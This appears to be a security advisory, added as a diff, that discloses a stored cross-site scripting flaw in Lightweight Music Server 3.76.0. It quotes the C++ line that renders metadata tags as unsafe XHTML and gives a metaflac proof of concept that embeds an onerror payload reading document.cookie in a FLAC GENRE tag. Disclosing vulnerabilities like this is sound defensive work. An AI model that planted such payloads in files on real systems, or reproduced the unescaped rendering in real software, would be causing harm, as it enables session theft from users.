@@ -1,0 +1,77 @@
+
+Lightweight Music Server (LMS) 3.76.0 (metadata) Stored XSS
+
+
+Vendor: Emeric Poupon
+Product web page: https://github.com/epoupon/lms
+Affected version 3.76.0
+
+Summary: LMS (Lightweight Music Server): A specific C++ based
+project focused on a low memory footprint, featuring built-in
+user management and a recommendation engine.
+
+Desc: LMS stores media file metadata tags (such as GENRE, ARTIST,
+and ALBUM) exactly as written in the file and later renders them
+in its web interface without HTML-encoding, resulting in stored
+cross-site scripting. An attacker who gets a file with a malicious
+tag into the victim's library has their payload saved during the
+next library scan and executed automatically whenever a user views
+that track's information or plays the file in the web UI.
+
+--------------------------------------------------------------
+/src/lms/ui/Utils.cpp
+---------------------
+131: std::unique_ptr<Wt::WInteractWidget> createFilter(const Wt::WString& name, const Wt::WString& tooltip, std::string_view colorStyleClass, bool canDelete)
+132: {
+133:   auto res{ std::make_unique<Wt::WText>(Wt::WString{ canDelete ? "<i class=\"fa fa-times-circle\"></i> " : "" } + name, Wt::TextFormat::UnsafeXHTML) };
+134:   res->setStyleClass("Lms-badge-cluster badge me-1 " + std::string{ colorStyleClass });
+135:   res->setInline(true);
+136:   return res;
+137: }
+--------------------------------------------------------------
+
+Tested on: GNU/Linux (ARM64)
+           nginx
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5987
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5987
+
+
+27.05.2026
+
+--
+
+
+$ metaflac --set-tag=GENRE="<img src=1 onerror=alert(document.cookie)>" evil.flac
+$ metaflac --list evil.flac
+METADATA block #0
+  type: 0 (STREAMINFO)
+  is last: false
+  length: 34
+  minimum blocksize: 4608 samples
+  maximum blocksize: 4608 samples
+  minimum framesize: 2305 bytes
+  maximum framesize: 14124 bytes
+  sample_rate: 44100 Hz
+  channels: 2
+  bits-per-sample: 16
+  total samples: 4664587
+  MD5 signature: 2aeee69c0153cb652c718dfdf0e9ff2d
+METADATA block #1
+  type: 4 (VORBIS_COMMENT)
+  is last: false
+  length: 98
+  vendor string: Lavf57.83.100
+  comments: 2
+    comment[0]: encoder=Lavf57.83.100
+    comment[1]: GENRE=<img src=1 onerror=alert(document.cookie)>
+METADATA block #2
+  type: 1 (PADDING)
+  is last: true
+  length: 8140
+
